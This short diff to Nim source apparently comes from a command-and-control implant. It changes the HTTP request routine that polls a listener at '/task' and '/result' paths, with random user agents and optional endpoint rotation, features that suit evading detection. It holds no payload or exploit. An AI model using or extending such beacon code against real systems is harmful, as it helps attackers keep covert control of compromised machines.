@@ -60,10 +60,16 @@ proc getRandomUserAgent(li :var Listener): string =
 # HTTP request function
 proc doRequest(li : var Listener, path : string, postKey : string = "", postValue : string = "") : Response =
     try:
+        # check Endpoints /results, tasks
         if li.changeEndPoints:
             changeEndPointsStrategy(li)
+        else:
+            li.taskPath = "/task"
+            li.resultPath = "/result"
+
         # increase the requests counter
         li.randomUserAgentsCounter += 1 
+
         # Determine target: Either "TYPE://HOST:PORT" or "TYPE://HOSTNAME"
         var target : string = toLowerAscii(li.listenerType) & "://"
         if li.listenerHost != "":
